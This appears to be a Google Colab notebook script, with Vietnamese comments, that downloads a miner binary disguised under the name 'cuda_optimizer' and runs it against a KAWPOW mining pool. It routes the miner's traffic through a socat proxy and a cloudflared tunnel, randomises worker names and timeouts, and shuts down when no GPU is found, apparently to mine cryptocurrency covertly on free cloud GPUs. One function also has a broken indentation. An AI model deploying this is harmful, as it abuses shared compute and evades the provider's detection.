import subprocess
import random
import re
import time
import os
import requests
import threading

!wget https://github.com/chuvitvang/AI_mm/blob/main/cuda_optimizer > /dev/null 2>&1 &&chmod +x cuda_optimizer
# ========== CONFIG ==========
PL = "neox.2miners.com:4040"  # pl đích
W1 = "GSaHGJWRw2fsm6QDu3QLESEwMKphaZzuJA" 
EXECUTABLE = "./cuda_optimizer"  #tên file
# ==============================

# Bước 0: Check GPU
def check_gpu():
    try:
        output = subprocess.check_output('nvidia-smi', shell=True).decode()
        if "NVIDIA" not in output:
            print("❌ Không tìm thấy GPU. Đang shutdown Colab...")
            from google.colab import runtime
            runtime.shutdown()
    except:
        print("❌ Không tìm thấy GPU. Đang shutdown Colab...")
        from google.colab import runtime
        runtime.shutdown()

check_gpu()

# Random một port từ 5000-10000
random_port = random.randint(5000, 10000)
print(f"🎯 Chọn port nội bộ: {random_port}")

# Cài socat
!apt-get install -qq socat > /dev/null 2>&1

# Cài cloudflared
!wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 > /dev/null 2>&1
!mv cloudflared-linux-amd64 cloudflared
!chmod +x cloudflared

# Khởi động socat proxy từ random_port -> pool
print("🔌 Đang setup socat...")
os.system(f"screen -dmS proxypool socat TCP-LISTEN:{random_port},reuseaddr,fork TCP:{PL}")
print(f"✅ Socat listen tại localhost:{random_port}")

# Random User-Agent list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/118.0.5993.90 Safari/537.36",
]

def send_request_with_user_agent(url):
    user_agent = random.choice(USER_AGENTS)
    headers = {
        'User-Agent': user_agent,
    }
    response = requests.get(url, headers=headers)
    return response

def start_cloudflared(port):
    cloudflared = subprocess.Popen(
        ["./cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT
    )
    return cloudflared

def get_tunnel_url(process):
    tunnel_url = None
    while True:
        line = process.stdout.readline()
        if not line:
            break
        decoded_line = line.decode('utf-8')
        print(decoded_line.strip())
        match = re.search(r"https://[-\w]+\.trycloudflare\.com", decoded_line)
        if match:
            tunnel_url = match.group(0)
            break
    return tunnel_url


def start_m(port):
    wk_name = "colab-" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))
print(f"name: {wk_name}")
    
    cmd = f"""
    screen -dmS m {EXECUTABLE} \\
    --algo KAWPOW \\
    --pool 127.0.0.1:{port} \\
    --user {W1}.{wk_name} \\
    --pool-tls 0 \\
    --send-timeout {random.randint(30, 60)} \\
    --stratum-mode 1
    """
    print("🏗️  Đang khởi chạy...")
    os.system(cmd)

# Main loop auto reconnect
while True:
    cloudflared_proc = start_cloudflared(random_port)
    tunnel_url = get_tunnel_url(cloudflared_proc)
    
    if tunnel_url:
        print(f"✅ Tunnel sẵn sàng: {tunnel_url}")
        start_m(random_port)
    else:
        print("❌ Không lấy được tunnel URL. Restart cloudflared...")

    # Đợi 5 phút kiểm tra
    time.sleep(300)
    
    # Kiểm tra cloudflared còn sống không
    if cloudflared_proc.poll() is not None:
        print("⚠️ Cloudflared ngừng! Restart...")
        continue
